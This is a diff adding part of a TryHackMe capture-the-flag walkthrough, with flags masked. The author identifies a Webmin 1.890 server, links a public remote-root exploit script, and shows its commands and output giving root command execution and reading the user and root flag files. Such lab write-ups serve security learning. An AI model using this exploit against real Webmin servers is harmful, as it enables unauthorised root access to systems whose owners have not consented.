@@ -71,6 +71,7 @@ So I hop into my browser and go the path with https.
 ## Trying to log in as a admin
 
 Like everyone I tried:
+
 - admin:admin
 - admin:password
 
@@ -81,6 +82,7 @@ Someone on the forums said this:
 ```text
 The default user name and password is that of your root user.
 ```
+
 After that I checked webmin version the server was runnning:
 
 ```text
@@ -89,3 +91,78 @@ After that I checked webmin version the server was runnning:
 
 And googled the version for any CVE's. And I found one, also found a script that exploits that security vulnerability. Here's the github repo for the script: <https://github.com/n0obit4/Webmin_1.890-POC/blob/master/Webmin_exploit.py>
 
+```bash
+❯ python script.py -host $IP -port 10000 -cmd id
+
+╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
+║║║├┤ ├┴┐│││││││
+╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root
+
+			By: n0obit4
+			Github: https://github.com/n0obit4
+Your password has expired, and a new one must be chosen.
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+And we got access with root.
+
+## Gaining Flags
+
+For user:
+
+```bash
+❯ python fuck.py -host $IP -port 10000 -cmd "ls /home"          
+
+╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
+║║║├┤ ├┴┐│││││││
+╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root
+    
+			By: n0obit4
+			Github: https://github.com/n0obit4
+Your password has expired, and a new one must be chosen.
+dark
+
+
+~/dev/Python via  v3.13.3 (myenv) 
+❯ python fuck.py -host $IP -port 10000 -cmd "ls /home/dark"
+
+╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
+║║║├┤ ├┴┐│││││││
+╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root
+    
+			By: n0obit4
+			Github: https://github.com/n0obit4
+Your password has expired, and a new one must be chosen.
+user.txt
+webmin_1.890_all.deb
+
+
+~/dev/Python via  v3.13.3 (myenv) 
+❯ python fuck.py -host $IP -port 10000 -cmd "cat /home/dark/user.txt"
+
+╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
+║║║├┤ ├┴┐│││││││
+╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root
+    
+			By: n0obit4
+			Github: https://github.com/n0obit4
+Your password has expired, and a new one must be chosen.
+THM{*******************}
+```
+
+For root:
+
+```bash
+❯ python fuck.py -host $IP -port 10000 -cmd "cat /root/root.txt"
+
+╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
+║║║├┤ ├┴┐│││││││
+╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root
+
+			By: n0obit4
+			Github: https://github.com/n0obit4
+Your password has expired, and a new one must be chosen.
+THM{*******************}
+```
+
+Easy as that. Thanks you for reading my solution.
